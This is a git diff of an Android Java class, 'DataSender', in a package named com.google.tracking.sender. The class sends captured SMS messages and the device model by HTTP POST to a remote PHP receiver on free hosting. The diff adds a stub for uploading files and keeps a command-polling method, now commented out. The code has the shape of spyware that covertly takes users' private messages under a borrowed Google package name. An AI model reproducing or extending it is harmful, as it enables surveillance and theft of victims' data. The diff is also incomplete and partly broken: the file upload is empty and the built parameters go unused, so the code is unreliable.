@@ -2,11 +2,14 @@ package com.google.tracking.sender;
 
 import android.os.Build;
 import android.util.Log;
+import com.google.tracking.constants.TrackingConstants;
 
 import java.io.DataOutputStream;
+import java.io.File;
 import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
+import java.net.PortUnreachableException;
 import java.net.URL;
 import java.nio.charset.Charset;
 
@@ -15,32 +18,43 @@ import java.nio.charset.Charset;
  */
 public class DataSender implements IDataSender{
     private static final String TAG = "DataSender";
-    private static String urlString = "http://track.byethost16.com/receiver.php";
+
     private static String SMS = "sms";
     private static String COMMAND = "command";
+    private static String SAVE_FILE = "file";
 
     public DataSender() {
-        Log.d(TAG, urlString.toString());
+        Log.d(TAG, urlString().toString());
 
         disableConnectionReuseIfNecessary();
     }
 
+    public String urlString(){
+        return TrackingConstants.WEB_SERVICE_URL;
+    }
+
     public void getNextAction() {
-        postHttp(COMMAND, "message");
+//        postHttp(COMMAND, "message");
     }
 
     public void sendSMS(String msg) {
-        postHttp(SMS, msg);
+        postHttp(SMS, msg.getBytes());
     }
 
-    private void postHttp(String action, String msg) {
+    public void sendFile(byte[] file){
+
+
+//        postHttp(SAVE_FILE, );
+    }
+
+    private void postHttp(String action, byte[] postData) {
         try {
 
-            String urlParameters = "action=" + action + "&msg=" + msg + "&model=" + Build.MODEL;
-            byte[] postData = urlParameters.getBytes(Charset.forName("UTF-8"));
+            String urlParameters = "action=" + action + "&msg=" + "" + "&model=" + Build.MODEL;
+
             int postDataLength = postData.length;
 
-            URL url = new URL(urlString);
+            URL url = new URL(urlString());
             HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
             httpConn.setDoOutput(true);
             httpConn.setDoInput(true);
